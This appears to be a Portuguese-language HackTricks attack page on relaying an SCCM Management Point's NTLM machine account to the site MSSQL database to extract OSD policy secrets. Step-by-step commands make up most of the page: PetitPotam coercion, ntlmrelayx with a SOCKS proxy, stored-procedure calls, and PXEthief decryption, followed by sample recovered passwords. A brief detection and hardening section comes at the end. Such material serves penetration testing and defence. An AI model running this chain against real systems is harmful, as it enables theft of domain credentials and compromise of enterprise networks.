# SCCM Management Point NTLM Relay to SQL – Extração de Segredos da Política OSD

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Ao forçar um **System Center Configuration Manager (SCCM) Management Point (MP)** a autenticar via SMB/RPC e **revezar** essa conta de máquina NTLM para o **banco de dados do site (MSSQL)**, você obtém direitos `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Esses papéis permitem que você chame um conjunto de procedimentos armazenados que expõem blobs de política de **Implantação do Sistema Operacional (OSD)** (credenciais da Conta de Acesso à Rede, variáveis de Sequência de Tarefas, etc.). Os blobs são codificados/criptografados em hex, mas podem ser decodificados e descriptografados com **PXEthief**, resultando em segredos em texto claro.

Cadeia de alto nível:
1. Descubra MP & DB do site ↦ endpoint HTTP não autenticado `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Inicie `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Force o MP usando **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Através do proxy SOCKS, conecte-se com `mssqlclient.py -windows-auth` como a conta **<DOMAIN>\\<MP-host>$** revezada.
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ou `MP_GetPolicyBodyAfterAuthorization`)
6. Remova `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Segredos como `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. são recuperados sem tocar no PXE ou nos clientes.

---

## 1. Enumerando endpoints MP não autenticados
A extensão ISAPI do MP **GetAuth.dll** expõe vários parâmetros que não requerem autenticação (a menos que o site seja apenas PKI):

| Parâmetro | Propósito |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Retorna a chave pública do certificado de assinatura do site + GUIDs de dispositivos **Todos os Computadores Desconhecidos** *x86* / *x64*. |
| `MPLIST` | Lista todos os Management-Points no site. |
| `SITESIGNCERT` | Retorna o certificado de assinatura do Site Primário (identifica o servidor do site sem LDAP). |

Capture os GUIDs que atuarão como **clientID** para consultas de DB posteriores:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Revezar a conta da máquina MP para MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Quando a coação é acionada, você deve ver algo como:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identificar políticas OSD via procedimentos armazenados
Conecte-se através do proxy SOCKS (porta 1080 por padrão):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Mude para o **CM_<SiteCode>** DB (use o código de site de 3 dígitos, por exemplo, `CM_001`).

### 3.1  Encontrar GUIDs de Computador Desconhecido (opcional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Listar políticas atribuídas
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Cada linha contém `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Concentre-se nas políticas:
* **NAAConfig**  – Credenciais da Conta de Acesso à Rede
* **TS_Sequence** – Variáveis da Sequência de Tarefas (OSDJoinAccount/Password)
* **CollectionSettings** – Pode conter contas de execução

### 3.3  Recuperar corpo completo
Se você já tiver `PolicyID` e `PolicyVersion`, pode pular o requisito de clientID usando:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANTE: No SSMS, aumente "Máximo de Caracteres Recuperados" (>65535) ou o blob será truncado.

---

## 4. Decodifique e desencripte o blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Exemplo de segredos recuperados:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Funções e procedimentos SQL relevantes
Ao relatar, o login é mapeado para:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Essas funções expõem dezenas de permissões EXEC, as principais usadas neste ataque são:

| Procedimento Armazenado | Propósito |
|--------------------------|----------|
| `MP_GetMachinePolicyAssignments` | Listar políticas aplicadas a um `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Retornar o corpo completo da política. |
| `MP_GetListOfMPsInSiteOSD` | Retornado pelo caminho `MPKEYINFORMATIONMEDIA`. |

Você pode inspecionar a lista completa com:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Detecção e Fortalecimento
1. **Monitore logins do MP** – qualquer conta de computador do MP fazendo login de um IP que não é seu host ≈ relay.
2. Ative a **Proteção Estendida para Autenticação (EPA)** no banco de dados do site (`PREVENT-14`).
3. Desative NTLM não utilizado, aplique assinatura SMB, restrinja RPC (
mesmas mitig ações usadas contra `PetitPotam`/`PrinterBug`).
4. Fortaleça a comunicação MP ↔ DB com IPSec / mutual-TLS.

---

## Veja também
* Fundamentos de relay NTLM:

{{#ref}}
../ntlm/README.md
{{#endref}}

* Abuso de MSSQL e pós-exploração:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Referências
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
